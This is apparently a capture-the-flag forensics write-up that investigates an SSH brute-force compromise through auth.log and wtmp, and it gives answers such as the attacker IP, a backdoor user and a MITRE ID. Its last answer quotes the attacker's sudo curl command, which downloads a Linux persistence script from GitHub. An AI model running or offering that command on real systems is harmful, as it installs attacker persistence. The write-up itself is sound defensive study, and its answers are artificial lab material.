Scenario

In this investigation, I analysed Unix authentication logs (auth.log) and wtmp records from a Confluence server that had been compromised through an SSH brute-force attack. After obtaining access, the attacker carried out several actions on the system and these activities are traceable within the provided logs. While auth.log is typically used to identify brute-force attempts, in this case I used it to examine additional behaviour, including privilege escalation, user persistence, and limited command execution visibility.

Artifacts Provided

    - auth.log
    - wtmp


Q) Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?

**cat auth.log| grep -i failed**

<img width="1920" height="1080" alt="FailedPasswordBrutus" src="https://github.com/user-attachments/assets/ea78557e-e559-4c0f-a333-65ab46e85216" />


**Answer: 65.2.161.68**

Q) The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?

I searched for successful authentications using the keyword “Accepted password” using the grep tool and looked for the attacker’s IP address related to the accepted password. This confirmed that the attacker successfully authenticated using the root account, gaining access to the most privileged user on the system.

**cat auth.log| grep -i accepted**


<img width="1920" height="1080" alt="AcceptedPasswordBrutus" src="https://github.com/user-attachments/assets/392a7cf7-f3cd-41bb-8b6c-52198b12a907" />



**Answer: Root**

Q) Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.

The attacker first brute-forced the credentials, but their actual manual login session is recorded in the wtmp log, not in auth.log. Since wtmp is a binary file, I used the **last -f ./wtmp -F**



<img width="1920" height="1080" alt="FirstTimeManuallyLogon" src="https://github.com/user-attachments/assets/19a3f010-8bf9-42a8-847d-837329237628" />



**Answer: 2024-03-06 06:32:45**

Q) SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?

To identify the session number assigned during the attacker’s login, I filtered the auth.log using the timestamp associated with the confirmed manual login.

**cat auth.log | grep -i '06:32:4'**


<img width="1920" height="1080" alt="LogonSessionIDBrutus" src="https://github.com/user-attachments/assets/3436ad6e-dc1e-49d0-83af-e4849bcdd861" />



**Answer: 37**

Q) The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?

Using grep to search for user creation activity (keywords such as “add”), I observed that immediately after the attacker accessed the system via session 37, a new local user was created. The logs also show that this user was added to a privileged group, confirming a persistence mechanism.

**cat auth.log | grep -i add**



<img width="1920" height="1080" alt="UserAddedBrutus" src="https://github.com/user-attachments/assets/d1b8daf6-b1ff-4786-9549-f271aeb28b6d" />



**Answer: cyberjunkie**

Q) What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?

Creating a new local account for persistence aligns with the MITRE ATT&CK Framework’s “Create Account” technique under the Persistence tactic.



<img width="1920" height="1080" alt="MitreBrutus" src="https://github.com/user-attachments/assets/422fad66-5ead-47c4-ad48-81c3d542d910" />



**Answer:  T1136.001** 

Q) What time did the attacker's first SSH session end according to auth.log?

To determine when the attacker’s SSH session ended, I filtered the auth.log using grep tool with keyword `**logged out**’ entries associated with the root account.



<img width="1920" height="1080" alt="LoggedOutBrutus" src="https://github.com/user-attachments/assets/519541b1-9caa-4eae-831b-8b180b12cbf5" />



**Answer: 2024-03-06 06:37:24**

Q) The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?

After reviewing auth.log for activity tied to the newly created user cyberjunkie and any sudo usage, I found evidence of command execution. While auth.log doesn’t record general command history, it does log all sudo activity. The attacker leveraged their newly created privileged account to run a sudo curl command and download a shell script from a remote repository.

**cat auth.log | grep -i curl**



<img width="1920" height="1080" alt="DownloadedScriptBrutus" src="https://github.com/user-attachments/assets/4ea0f0b5-062a-4d4f-8a5d-27d4eb0e0a98" />



**Answer: /usr/bin/curl 'https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh'**
